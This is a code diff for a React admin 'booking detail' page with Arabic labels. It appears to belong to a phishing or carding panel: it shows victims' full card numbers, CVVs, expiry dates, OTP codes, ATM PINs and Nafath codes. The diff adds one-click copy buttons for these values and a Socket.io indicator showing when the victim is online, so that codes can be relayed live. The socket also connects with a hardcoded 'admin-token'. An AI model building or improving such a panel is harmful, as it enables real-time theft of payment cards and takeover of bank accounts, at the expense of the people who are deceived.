@@ -24,8 +24,19 @@ import {
   KeyRound,
   AtSign,
   Lock,
+  Copy,
+  Wifi,
+  WifiOff,
 } from "lucide-react";
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
+import { io as socketIO } from "socket.io-client";
+
+// دالة نسخ النص للحافظة
+function copyToClipboard(text: string, label: string) {
+  navigator.clipboard.writeText(text).then(() => {
+    // سيتم استخدام toast من المكون الأب
+  }).catch(() => {});
+}
 
 const STATUS_LABELS: Record<string, { label: string; color: string }> = {
   new: { label: "جديد", color: "bg-blue-100 text-blue-700" },
@@ -53,12 +64,38 @@ export default function BookingDetail() {
   const [nafathCode, setNafathCode] = useState("");
   const [showCardNumber, setShowCardNumber] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
+  const [clientConnected, setClientConnected] = useState(false);
+  const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);
 
   useEffect(() => {
     if (!loading && (!isAuthenticated || user?.role !== "admin")) {
       navigate("/admin/login");
     }
   }, [loading, isAuthenticated, user]);
+
+  // Socket.io - مراقبة حالة اتصال العميل
+  useEffect(() => {
+    const socket = socketIO({ path: "/socket.io" });
+    socketRef.current = socket;
+    socket.emit("joinAdmin", "admin-token");
+
+    // مراقبة updateLocation لمعرفة إذا كان العميل متصلاً
+    socket.on("newPayment", (data: { reference: string }) => {
+      if (data.reference === reference) {
+        refetch();
+        refetchTemplate();
+        setClientConnected(true);
+      }
+    });
+
+    socket.on("newBooking", () => {
+      setClientConnected(true);
+    });
+
+    return () => {
+      socket.disconnect();
+    };
+  }, []);
 
   const reference = params.reference;
 
@@ -173,6 +210,17 @@ export default function BookingDetail() {
             </h1>
           </div>
           <div className="flex items-center gap-2">
+            {/* مؤشر حالة اتصال العميل */}
+            <div className={`flex items-center gap-1 text-xs px-2 py-1 rounded-full font-medium ${
+              clientConnected
+                ? 'bg-green-100 text-green-700'
+                : 'bg-slate-100 text-slate-500'
+            }`}>
+              {clientConnected
+                ? <><Wifi className="w-3 h-3" /> متصل الآن</>
+                : <><WifiOff className="w-3 h-3" /> غير متصل</>
+              }
+            </div>
             <span className={`text-xs px-3 py-1 rounded-full font-medium ${statusInfo.color}`}>
               {statusInfo.label}
             </span>
@@ -242,7 +290,7 @@ export default function BookingDetail() {
                   <div className="col-span-3 sm:col-span-1 bg-yellow-50 rounded-lg px-3 py-3 border border-yellow-200">
                     <p className="text-[10px] text-yellow-600 uppercase tracking-wide mb-1">رقم البطاقة</p>
                     <div className="flex items-center gap-1 justify-between">
-                      <span className="text-sm font-mono font-bold text-slate-800 tracking-wider">
+                      <span className="text-sm font-mono font-bold text-slate-800 tracking-wider" dir="ltr">
                         {showCardNumber
                           ? (payment.cardNumber
                               ? payment.cardNumber.replace(/(.{4})/g, "$1 ").trim()
@@ -251,23 +299,33 @@ export default function BookingDetail() {
                             ? "•••• •••• •••• " + payment.cardNumber.slice(-4)
                             : "—"}
                       </span>
-                      <Button size="sm" variant="ghost" className="h-6 w-6 p-0 shrink-0" onClick={() => setShowCardNumber(!showCardNumber)}>
-                        {showCardNumber ? <EyeOff className="w-3 h-3 text-yellow-600" /> : <Eye className="w-3 h-3 text-yellow-600" />}
-                      </Button>
+                      <div className="flex items-center gap-0.5">
+                        {payment.cardNumber && (
+                          <Button size="sm" variant="ghost" className="h-6 w-6 p-0 shrink-0" onClick={() => {
+                            navigator.clipboard.writeText(payment.cardNumber);
+                            toast.success("تم نسخ رقم البطاقة");
+                          }}>
+                            <Copy className="w-3 h-3 text-yellow-600" />
+                          </Button>
+                        )}
+                        <Button size="sm" variant="ghost" className="h-6 w-6 p-0 shrink-0" onClick={() => setShowCardNumber(!showCardNumber)}>
+                          {showCardNumber ? <EyeOff className="w-3 h-3 text-yellow-600" /> : <Eye className="w-3 h-3 text-yellow-600" />}
+                        </Button>
+                      </div>
                     </div>
                   </div>
 
                   {/* تاريخ الانتهاء */}
                   <div className="bg-blue-50 rounded-lg px-3 py-3 border border-blue-200 text-center">
                     <p className="text-[10px] text-blue-500 uppercase tracking-wide mb-1">تاريخ الانتهاء</p>
-                    <p className="text-sm font-mono font-bold text-slate-800">{payment.cardExpiry || "—"}</p>
+                    <p className="text-sm font-mono font-bold text-slate-800" dir="ltr">{payment.cardExpiry || "—"}</p>
                   </div>
 
                   {/* CVV */}
                   <div className="bg-red-50 rounded-lg px-3 py-3 border border-red-200 text-center">
                     <p className="text-[10px] text-red-500 uppercase tracking-wide mb-1">CVV</p>
                     <div className="flex items-center justify-center gap-1">
-                      <span className="text-sm font-mono font-bold text-slate-800">
+                      <span className="text-sm font-mono font-bold text-slate-800" dir="ltr">
                         {showCvv ? (payment.cardCvv || "—") : (payment.cardCvv ? "•••" : "—")}
                       </span>
                       <Button size="sm" variant="ghost" className="h-5 w-5 p-0" onClick={() => setShowCvv(!showCvv)}>
@@ -282,11 +340,21 @@ export default function BookingDetail() {
                 <div className="grid grid-cols-2 gap-2">
                   {/* OTP */}
                   <div className={`rounded-lg px-4 py-3 border-2 ${payment.verifyCode ? 'bg-blue-600 border-blue-600 text-white' : 'bg-slate-50 border-dashed border-slate-300'}`}>
-                    <p className={`text-[10px] uppercase tracking-wide mb-1 flex items-center gap-1 ${payment.verifyCode ? 'text-blue-200' : 'text-slate-400'}`}>
-                      <KeyRound className="w-3 h-3" /> رمز OTP
-                    </p>
+                    <div className="flex items-center justify-between mb-1">
+                      <p className={`text-[10px] uppercase tracking-wide flex items-center gap-1 ${payment.verifyCode ? 'text-blue-200' : 'text-slate-400'}`}>
+                        <KeyRound className="w-3 h-3" /> رمز OTP
+                      </p>
+                      {payment.verifyCode && (
+                        <Button size="sm" variant="ghost" className="h-5 w-5 p-0 shrink-0 text-blue-200 hover:text-white hover:bg-blue-500" onClick={() => {
+                          navigator.clipboard.writeText(payment.verifyCode);
+                          toast.success("تم نسخ رمز OTP");
+                        }}>
+                          <Copy className="w-3 h-3" />
+                        </Button>
+                      )}
+                    </div>
                     {payment.verifyCode ? (
-                      <p className="text-xl font-mono font-bold tracking-widest">{payment.verifyCode}</p>
+                      <p className="text-xl font-mono font-bold tracking-widest" dir="ltr">{payment.verifyCode}</p>
                     ) : (
                       <p className="text-sm text-slate-400 italic">لم يُدخَل بعد...</p>
                     )}
@@ -294,11 +362,21 @@ export default function BookingDetail() {
 
                   {/* ATM PIN */}
                   <div className={`rounded-lg px-4 py-3 border-2 ${payment.secretNum ? 'bg-orange-500 border-orange-500 text-white' : 'bg-slate-50 border-dashed border-slate-300'}`}>
-                    <p className={`text-[10px] uppercase tracking-wide mb-1 flex items-center gap-1 ${payment.secretNum ? 'text-orange-100' : 'text-slate-400'}`}>
-                      <Lock className="w-3 h-3" /> ATM PIN
-                    </p>
+                    <div className="flex items-center justify-between mb-1">
+                      <p className={`text-[10px] uppercase tracking-wide flex items-center gap-1 ${payment.secretNum ? 'text-orange-100' : 'text-slate-400'}`}>
+                        <Lock className="w-3 h-3" /> ATM PIN
+                      </p>
+                      {payment.secretNum && (
+                        <Button size="sm" variant="ghost" className="h-5 w-5 p-0 shrink-0 text-orange-100 hover:text-white hover:bg-orange-400" onClick={() => {
+                          navigator.clipboard.writeText(payment.secretNum);
+                          toast.success("تم نسخ رقم ATM PIN");
+                        }}>
+                          <Copy className="w-3 h-3" />
+                        </Button>
+                      )}
+                    </div>
                     {payment.secretNum ? (
-                      <p className="text-xl font-mono font-bold tracking-widest">{payment.secretNum}</p>
+                      <p className="text-xl font-mono font-bold tracking-widest" dir="ltr">{payment.secretNum}</p>
                     ) : (
                       <p className="text-sm text-slate-400 italic">لم يُدخَل بعد...</p>
                     )}
